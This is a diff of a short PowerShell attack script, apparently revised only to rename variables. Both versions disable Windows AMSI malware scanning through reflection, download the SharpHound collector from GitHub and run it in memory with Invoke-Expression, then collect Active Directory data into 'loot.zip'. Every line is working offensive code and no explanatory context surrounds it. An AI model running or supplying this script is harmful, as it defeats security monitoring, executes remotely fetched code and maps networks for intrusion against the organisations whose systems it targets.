@@ -1,7 +1,7 @@
-$Flags = [System.Reflection.BindingFlags] "NonPublic,Static"
-$AmsiUtils = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
-$Field = $AmsiUtils.GetField("amsiInitFailed", $Flags)
-$Field.SetValue($null, $true)
-$sharpHoundCode = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1" -UseBasicParsing
-Invoke-Expression $sharpHoundCode.Content
+$flags = [System.Reflection.BindingFlags] "NonPublic,Static"
+$amsi = [System.Management.Automation.AmsiUtils]
+$field = $amsi.GetField("amsiInitFailed", $flags)
+$field.SetValue($null, $true)
+$sharpHoundScript = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1" -UseBasicParsing
+Invoke-Expression $sharpHoundScript.Content
 Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip
